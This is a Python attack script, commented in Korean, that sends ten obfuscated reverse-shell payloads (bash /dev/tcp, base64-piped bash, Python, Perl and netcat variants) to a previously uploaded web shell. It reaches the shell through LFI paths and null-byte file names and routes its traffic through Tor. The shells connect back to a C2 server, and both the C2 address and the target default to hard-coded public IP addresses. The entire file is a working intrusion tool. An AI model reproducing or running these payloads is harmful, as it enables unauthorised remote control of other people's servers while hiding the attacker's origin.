#!/usr/bin/env python3
"""
업로드된 파일로 바로 리버스 쉘 시도
테스트 명령 없이 바로 난독화된 리버스 쉘 페이로드 전송
"""

import requests
import time
import base64
import urllib.parse

def direct_reverse_shell(target_ip, uploaded_file, c2_ip, c2_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    })

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] 웹쉘: uploads/{uploaded_file}")
    print(f"[*] C2: {c2_ip}:{c2_port}")

    # 난독화된 리버스 쉘 페이로드들
    reverse_shell_cmd = f"bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1"
    b64_payload = base64.b64encode(reverse_shell_cmd.encode()).decode()

    payloads = [
        # 1. Base64 인코딩
        f"echo {b64_payload}|base64 -d|bash",

        # 2. Python 리버스 쉘
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{c2_ip}\",{c2_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",

        # 3. 변수 우회
        f"H={c2_ip};P={c2_port};bash -c \"bash -i >& /dev/tcp/$H/$P 0>&1\"",

        # 4. 파일 기반
        f"echo '{reverse_shell_cmd}' > /tmp/.s;bash /tmp/.s",

        # 5. nc (있다면)
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {c2_ip} {c2_port} >/tmp/f",

        # 6. Perl
        f"perl -e 'use Socket;$i=\"{c2_ip}\";$p={c2_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",

        # 7. 소켓 프로그래밍
        f"exec 5<>/dev/tcp/{c2_ip}/{c2_port};cat <&5 | while read line; do $line 2>&5 >&5; done",

        # 8. 단순 bash
        f"bash -c '{reverse_shell_cmd}'",

        # 9. /bin/bash 직접
        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1'",

        # 10. 환경변수
        f"export RHOST={c2_ip};export RPORT={c2_port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    ]

    print(f"\n[*] 총 {len(payloads)}개의 난독화된 리버스 쉘 페이로드")
    print(f"\n[!] C2 서버에서 리스너 시작:")
    print(f"    nc -lvnp {c2_port}")

    input("\n[?] 준비되면 Enter...")

    success_count = 0

    for i, payload in enumerate(payloads, 1):
        print(f"\n[{i}/{len(payloads)}] 페이로드 #{i}")

        # 페이로드 타입 표시
        if 'base64' in payload:
            print("    타입: Base64 인코딩")
        elif 'python' in payload:
            print("    타입: Python")
        elif 'perl' in payload:
            print("    타입: Perl")
        elif 'nc' in payload:
            print("    타입: Netcat")
        elif 'exec 5' in payload:
            print("    타입: Socket")
        else:
            print("    타입: Bash")

        # URL 구성
        # LFI 경로 시도
        lfi_urls = [
            f"{base_url}/file.php?name=uploads/{uploaded_file}&x={urllib.parse.quote(payload)}",
            f"{base_url}/uploads/{uploaded_file}?x={urllib.parse.quote(payload)}",
        ]

        for url in lfi_urls:
            try:
                resp = session.get(url, timeout=3)

                if resp.status_code == 200:
                    print(f"    [+] 200 OK")
                    success_count += 1
                    break
                elif resp.status_code == 403:
                    print(f"    [-] 403 Forbidden")
                else:
                    print(f"    [?] {resp.status_code}")

            except requests.exceptions.Timeout:
                print(f"    [+] 타임아웃 (쉘 연결되었을 가능성!)")
                print(f"    [!] C2 리스너 확인하세요!")
                success_count += 1
                break

            except Exception as e:
                print(f"    [-] 오류: {str(e)[:50]}")

        # 중간 확인
        if i % 3 == 0:
            check = input("\n[?] C2 연결됐나요? (y=중단, Enter=계속): ").strip().lower()
            if check == 'y':
                print("[+] 리버스 쉘 연결 확인!")
                return True

        time.sleep(2)

    print(f"\n[*] 완료: {success_count}/{len(payloads)} 시도")
    print(f"[!] C2 리스너 확인하세요")

    return False

def main():
    print("\n[*] 업로드된 파일로 바로 리버스 쉘 시도")

    target_ip = input("타겟 IP (기본: 43.201.154.142): ").strip() or "43.201.154.142"

    print("\n[*] 업로드된 파일:")
    print("    1. shell_4727.php%00.png")
    print("    2. shell_4727.php%00.gif")
    print("    3. avatar_4727.jpg")

    file_choice = input("파일 선택 (1-3, 기본: 3): ").strip() or "3"

    files = {
        "1": "shell_4727.php%00.png",
        "2": "shell_4727.php%00.gif",
        "3": "avatar_4727.jpg",
    }

    uploaded_file = files.get(file_choice, "avatar_4727.jpg")

    c2_ip = input("C2 IP (기본: 57.181.28.7): ").strip() or "57.181.28.7"
    c2_port = int(input("C2 포트 (기본: 4444): ").strip() or "4444")

    direct_reverse_shell(target_ip, uploaded_file, c2_ip, c2_port)

if __name__ == "__main__":
    main()
